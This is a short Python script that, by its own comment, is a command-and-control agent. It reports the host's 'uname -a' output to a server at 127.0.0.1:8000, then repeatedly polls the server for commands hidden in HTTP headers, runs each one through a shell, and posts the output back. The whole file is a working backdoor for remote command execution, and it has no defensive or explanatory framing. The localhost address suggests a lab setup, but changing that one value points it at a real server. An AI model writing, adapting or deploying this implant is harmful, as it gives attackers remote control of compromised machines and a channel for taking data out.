import requests
import subprocess
import time
from sys import exit

global target
target = "127.0.0.1:8000"

# create a small banner and register against C2
def login():
    myname = "uname -a"
    banner = subprocess.run(["sh","-c", myname], stdout=subprocess.PIPE)
    guid = banner.stdout.decode()
    requests.get(f"http://{target}/login?new={guid}")



def connect():
    sleep_time = 2
    while True:
        time.sleep(sleep_time)
        command, sleeping = check_task()
        if sleeping:
            sleep_time = int(sleeping)
        elif command:
            exe = subprocess.run(["sh", "-c", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if exe.stderr:
                output = exe.stderr.decode()
            else:
                output = exe.stdout.decode()
            message = {"command":command, "output": output}
            requests.post(f"http://{target}/results", json=message)

def check_task():
    try:
        r = requests.get(f"http://{target}/check", timeout=5)
        sleep = r.headers.get("X-Connection-Close")
        command = r.headers.get("X-Tasks")
        return command, sleep
    except requests.exceptions.Timeout:
        print("The request timed out")
        exit(1)
        return

def main():
    login()
    connect()

if __name__ == "__main__":
    main()